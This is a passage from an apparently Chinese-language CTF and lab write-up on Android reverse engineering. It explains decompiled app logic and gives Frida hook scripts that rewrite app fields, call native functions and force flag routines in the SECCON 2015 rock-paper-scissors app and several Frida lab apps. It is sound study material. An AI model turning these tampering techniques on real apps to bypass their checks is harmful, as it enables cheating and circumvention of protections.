class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先调用父类(Activity)的 <code>onCreate</code> 方法（必须）</p><p><code>setContentView(R.layout.activity_main);</code>这是将XML布局文件渲染成可视化的界面，在jadx里双击可以发现定义</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> activity_main = <span class="number">0x7f040018</span>;</span><br></pre></td></tr></table></figure><ol><li>传入资源ID <code>0x7f040018</code></li><li>系统解析：<ul><li>包ID 0x7f → 当前应用资源</li><li>类型ID 0x04 → layout类型</li><li>项ID 0x0018 → 第24个layout资源</li></ul></li><li>查找 resources.arsc 表</li><li>找到对应的 activity_main.xml 文件</li><li>加载并渲染布局</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.P = (Button) <span class="built_in">findViewById</span>(R.id.button);</span><br><span class="line"><span class="keyword">this</span>.S = (Button) <span class="built_in">findViewById</span>(R.id.button3);</span><br><span class="line"><span class="keyword">this</span>.r = (Button) <span class="built_in">findViewById</span>(R.id.buttonR);</span><br></pre></td></tr></table></figure><p>获取布局文件中定义的按钮空间引用，跟上述的资源ID是类似的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.P.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line"><span class="keyword">this</span>.r.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br><span class="line"><span class="keyword">this</span>.S.<span class="built_in">setOnClickListener</span>(<span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>为这些按钮设置点击事件监视器</p><p>之后设置flag&#x3D;0完成初始化；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">@Override <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="type">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.flag != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = <span class="number">1</span>;</span><br><span class="line">        TextView result = (TextView) <span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">        result.<span class="built_in">setText</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        TextView user = (TextView) <span class="built_in">findViewById</span>(R.id.textView);</span><br><span class="line">        TextView laptop = (TextView) <span class="built_in">findViewById</span>(R.id.textView2);</span><br><span class="line">        <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">        Random rm = <span class="keyword">new</span> <span class="built_in">Random</span>();</span><br><span class="line">        <span class="keyword">this</span>.n = rm.<span class="built_in">nextInt</span>(<span class="number">3</span>);</span><br><span class="line">        String[] ss = &#123;<span class="string">&quot;CPU: Paper&quot;</span>, <span class="string">&quot;CPU: Rock&quot;</span>, <span class="string">&quot;CPU: Scissors&quot;</span>&#125;;</span><br><span class="line">        laptop.<span class="built_in">setText</span>(ss[<span class="keyword">this</span>.n]);</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="keyword">this</span>.P) &#123;</span><br><span class="line">            user.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Paper&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="keyword">this</span>.r) &#123;</span><br><span class="line">            user.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Rock&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (v == <span class="keyword">this</span>.S) &#123;</span><br><span class="line">            user.<span class="built_in">setText</span>(<span class="string">&quot;YOU: Scissors&quot;</span>);</span><br><span class="line">            <span class="keyword">this</span>.m = <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.handler.<span class="built_in">postDelayed</span>(<span class="keyword">this</span>.showMessageTask, <span class="number">1000L</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击之后就会触发onClick，逻辑很简单，电脑会随机输出，然后比对，之后延迟1s通过this.showMessageTask来显示结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Handler handler = <span class="keyword">new</span> <span class="built_in">Handler</span>();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Runnable showMessageTask = <span class="keyword">new</span> <span class="built_in">Runnable</span>() &#123; <span class="comment">// from class: com.example.seccon2015.rock_paper_scissors.MainActivity.1</span></span><br><span class="line">    @Override <span class="comment">// java.lang.Runnable</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">void</span> <span class="built_in">run</span>() &#123;</span><br><span class="line">        TextView tv3 = (TextView) MainActivity.<span class="keyword">this</span>.<span class="built_in">findViewById</span>(R.id.textView3);</span><br><span class="line">        <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.n - MainActivity.<span class="keyword">this</span>.m == <span class="number">1</span>) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;WIN! +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m - MainActivity.<span class="keyword">this</span>.n == <span class="number">1</span>) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m == MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;DRAW +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.m &lt; MainActivity.<span class="keyword">this</span>.n) &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.cnt = <span class="number">0</span>;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;LOSE +0&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            MainActivity.<span class="keyword">this</span>.cnt++;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;WIN! +&quot;</span> + String.<span class="built_in">valueOf</span>(MainActivity.<span class="keyword">this</span>.cnt));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) &#123;</span><br><span class="line">            tv3.<span class="built_in">setText</span>(<span class="string">&quot;SECCON&#123;&quot;</span> + String.<span class="built_in">valueOf</span>((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.<span class="built_in">calc</span>()) * <span class="number">107</span>) + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        MainActivity.<span class="keyword">this</span>.flag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>设置一个Runnable接口，其中this.handler.postDelayed(this.showMessageTask, 1000L);会调用该接口的run函数且这个接口也只能有一个run函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">点击事件触发</span><br><span class="line">    ↓</span><br><span class="line">handler.postDelayed(task, 1000)</span><br><span class="line">    ↓</span><br><span class="line">Handler将Runnable封装为Message加入消息队列</span><br><span class="line">    ↓ (1秒后)</span><br><span class="line">主线程Looper取出Message</span><br><span class="line">    ↓</span><br><span class="line">Handler执行Message.callback.run()</span><br><span class="line">    ↓</span><br><span class="line">我们的showMessageTask.run()被执行</span><br></pre></td></tr></table></figure><p>发现当连胜次数为1000时能获得一个flag</p><h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;activity android:name=<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>AndroidManifest.xml查看程序的入口Activity</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[V2185A::PID::<span class="number">4093</span> ]-&gt; Java.<span class="built_in">perform</span>(<span class="built_in">function</span> () &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&#x27;com.example.seccon2015.rock_paper_scissors.MainActivity&#x27;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span> (v) &#123;</span><br><span class="line">        <span class="built_in">send</span>(<span class="string">&quot;hook start&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">[V2185A::PID::<span class="number">4093</span> ]-&gt; message: &#123;<span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;send&#x27;</span>, <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;hook start&#x27;</span>&#125; data: None</span><br></pre></td></tr></table></figure><p>frida中使用MainActivity.onClick.implementation来进行对函数的hook</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, <span class="function">sys</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    print(message)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">jscode =</span> <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;</span>com.example.seccon2015.rock_paper_scissors.MainActivity<span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        this.onClick(v);</span></span><br><span class="line"><span class="string">        this.n.value = 2;</span></span><br><span class="line"><span class="string">        this.m.value = 1;</span></span><br><span class="line"><span class="string">        this.cnt.value = 999;</span></span><br><span class="line"><span class="string">        send(this.m.value);</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.<span class="built_in">get_usb_device</span>(<span class="number">1000</span>)  <span class="comment">//设备连接 超时1s</span></span><br><span class="line"></span><br><span class="line">process = device.<span class="built_in">attach</span>(<span class="number">4836</span>) <span class="comment">// attack pid</span></span><br><span class="line">script = process.<span class="built_in">create_script</span>(jscode)  <span class="comment">//hook脚本</span></span><br><span class="line">script.<span class="built_in">on</span>(<span class="string">&#x27;message&#x27;</span>, on_message)    <span class="comment">//信息回调</span></span><br><span class="line">script.<span class="built_in">load</span>()   <span class="comment">//运行脚本</span></span><br><span class="line"></span><br><span class="line">sys.stdin.<span class="built_in">read</span>() <span class="comment">//保持脚本运行</span></span><br></pre></td></tr></table></figure><p><strong>hook内部类</strong></p><p>可以直接考虑hook掉<code>com.example.seccon2015.rock_paper_scissors.MainActivity.1</code>，这是showMessageTask接口</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, <span class="function">sys</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    print(message)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">jscode =</span> <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;</span>com.example.seccon2015.rock_paper_scissors.MainActivity$<span class="number">1</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.run.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        this.this$0.value.m.value=1;</span></span><br><span class="line"><span class="string">        this.this$0.value.n.value=2;</span></span><br><span class="line"><span class="string">        this.this$0.value.cnt.value=999;</span></span><br><span class="line"><span class="string">        this.run();</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.<span class="built_in">get_usb_device</span>(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.<span class="built_in">attach</span>(<span class="number">4836</span>)</span><br><span class="line">script = process.<span class="built_in">create_script</span>(jscode)</span><br><span class="line">script.<span class="built_in">on</span>(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.<span class="built_in">load</span>()</span><br><span class="line"></span><br><span class="line">sys.stdin.<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure><p>要<code>com.example.seccon2015.rock_paper_scissors.MainActivity$1</code>这么写，然后就不能像之前一样直接this.m调用了，因为showMessageTask是内部类，java为每个内部类自动创建了一个指向外部类实例的字段，通常命名为<code>this$0</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Java.Field&#123;</span><br><span class="line">holder: com.example.seccon2015.rock_paper_scissors.MainActivity$<span class="number">1</span>@732991e,</span><br><span class="line">fieldType: <span class="number">2</span>,</span><br><span class="line">fieldReturnType: Lcom/example/seccon2015/rock_paper_scissors/MainActivity;,</span><br><span class="line">value: com.example.seccon2015.rock_paper_scissors.MainActivity@8d9c04,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现value就是想要的值， 那么直接<code>this.this$0.value.m.value</code>获取即可</p><p><strong>直接调用方法</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">1000</span> == MainActivity.<span class="keyword">this</span>.cnt) &#123;</span><br><span class="line">tv3.<span class="built_in">setText</span>(<span class="string">&quot;SECCON&#123;&quot;</span> + String.<span class="built_in">valueOf</span>((MainActivity.<span class="keyword">this</span>.cnt + MainActivity.<span class="keyword">this</span>.<span class="built_in">calc</span>()) * <span class="number">107</span>) + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onClick</span>(v);</span><br><span class="line">        console.<span class="built_in">log</span>((<span class="number">1000</span> + <span class="keyword">this</span>.<span class="built_in">calc</span>())*<span class="number">107</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>也是可以的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onClick</span>(v);</span><br><span class="line">        var modules = Process.<span class="built_in">enumerateModules</span>();</span><br><span class="line">        <span class="keyword">for</span>(var i in modules)&#123;</span><br><span class="line">            <span class="comment">// console.log(modules[i].name);</span></span><br><span class="line">            <span class="keyword">if</span> (modules[i].name == <span class="string">&quot;libcalc.so&quot;</span>)&#123;</span><br><span class="line">                var exports = modules[i].<span class="built_in">enumerateExports</span>();</span><br><span class="line">                <span class="keyword">for</span>(var j in exports)&#123;</span><br><span class="line">                    console.<span class="built_in">log</span>(exports[j].name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>列举输出<code>libcalc.so</code>动态库导出的函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onClick</span>(v);</span><br><span class="line">        var addr = Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;libcalc.so&quot;</span>,<span class="string">&quot;Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc&quot;</span>);</span><br><span class="line">        console.<span class="built_in">log</span>(addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>输出<code>Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc</code>这个符号对应方法的地址</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>()&#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.example.seccon2015.rock_paper_scissors.MainActivity&quot;</span>);</span><br><span class="line">    MainActivity.onClick.implementation = <span class="built_in">function</span>(v)&#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onClick</span>(v);</span><br><span class="line">        var addr = Module.<span class="built_in">findExportByName</span>(<span class="string">&quot;libcalc.so&quot;</span>,<span class="string">&quot;Java_com_example_seccon2015_rock_1paper_1scissors_MainActivity_calc&quot;</span>);</span><br><span class="line">        console.<span class="built_in">log</span>(addr);</span><br><span class="line">        var func = <span class="keyword">new</span> <span class="built_in">NativeFunction</span>(addr,<span class="string">&quot;int&quot;</span>,[]);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="built_in">func</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>使用<code>NativeFunction</code>得到对应的方法，并之后运行该函数</p><h2 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h2><h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><p>一个猜数字的，直接hook掉onClick调用check带有固定参数即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, <span class="function">sys</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">def <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line"><span class="function">    print(message)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">jscode =</span> <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;</span>com.ad2001.frida0x1.MainActivity$<span class="number">1</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        this.this$0.value.check(1,6);</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.<span class="built_in">get_usb_device</span>(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">process = device.<span class="built_in">attach</span>(<span class="number">5409</span>)</span><br><span class="line">script = process.<span class="built_in">create_script</span>(jscode)</span><br><span class="line">script.<span class="built_in">on</span>(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.<span class="built_in">load</span>()</span><br><span class="line"></span><br><span class="line">sys.stdin.<span class="built_in">read</span>()</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202503282033882.png" alt="image-20250327213059058" style="zoom:50%;" /><h3 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h3><p>直接使用python脚本 attack pid对其进行hook是行不通，在运行的时候会调用完onCreate方法，没有其他的方法调用能让我们进行hook，因此得在启动的瞬间就得直接进行hook的注入</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Java.<span class="built_in">perform</span>(<span class="built_in">function</span>() &#123;</span><br><span class="line">    var MainActivity = Java.<span class="built_in">use</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    MainActivity.onCreate.<span class="built_in">overload</span>(<span class="string">&#x27;android.os.Bundle&#x27;</span>).implementation = <span class="built_in">function</span>(bundle) &#123;</span><br><span class="line">        <span class="keyword">this</span>.<span class="built_in">onCreate</span>(bundle);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="string">&quot;触发get_flag方法...&quot;</span>);</span><br><span class="line">        console.<span class="built_in">log</span>(<span class="keyword">this</span>.<span class="built_in">get_flag</span>(<span class="number">4919</span>));</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>保存为hook.js</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.ad2001.frida0x2 -l hook.js</span><br></pre></td></tr></table></figure><p>就能在模拟器中看到flag啦，虽然还有报error为undefine（但问题应该不大？</p><h3 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h3><p>hook掉Checker静态变量code的值，然后再重新调用onClick</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">    var MainActivity = Java.use(&quot;com.ad2001.frida0x3.MainActivity$1&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    MainActivity.onClick.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">        var checker = Java.use(&quot;com.ad2001.frida0x3.Checker&quot;);</span></span><br><span 